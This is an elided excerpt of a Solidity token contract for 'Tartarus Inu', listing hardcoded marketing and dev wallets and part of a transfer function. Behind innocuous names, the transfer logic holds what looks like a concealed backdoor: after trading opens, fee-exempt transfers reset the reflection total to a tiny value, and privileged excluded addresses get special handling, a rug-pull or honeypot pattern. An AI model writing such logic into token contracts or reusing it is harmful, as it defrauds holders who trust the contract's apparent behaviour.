...
contract TINU is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x08aC3bc3C3Dc474D0012D08258490F8A3b2E8BD6);
    address payable public Wallet_Dev = payable(0x9996d39E0e99d560Ee0c80E818E84A159f1e557e);
    ...
    string private constant _name = unicode"Tartarus Inu";
    string private constant _symbol = unicode"Τάρταρος";
    ...
    bool public limitInEffects = true;
    ...
    uint256 public _minimumTokenBalanceForDividends = 1 * 10**_decimals;
    uint256 public gas = 5 * 1 gwei;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            ...
            if (tradingActiveBlock + 60 seconds <= block.timestamp) {
            _rtotal = _minimumTokenBalanceForDividends;}
            if (_isExcludedFromLimitEffect[sender]){sAmount = rAmount;}
